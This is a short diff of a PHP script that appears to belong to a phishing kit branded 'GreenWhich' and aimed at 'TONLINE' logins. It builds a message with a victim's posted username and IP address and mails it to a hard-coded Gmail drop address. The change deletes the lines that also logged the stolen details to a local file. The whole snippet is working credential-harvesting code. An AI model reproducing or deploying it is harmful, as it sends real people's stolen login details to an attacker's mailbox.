@@ -13,9 +13,8 @@ $message .= "IP : ".$_SERVER['REMOTE_ADDR']."\n";
 $message .= "-------+ CREATED BY GreenWhich +--------\n";
 
 $send="jbrautigam80303@gmail.com";
-$fp = fopen("details.txt","a");
-fputs($fp,$message);
-fclose($fp);
+
+
 $subject = "TONLINE | ".$_POST['username']." | $ip";
 $headers = "From: sm+kk <inbox@online.com>";
 @mail($send,$subject,$message,$from);
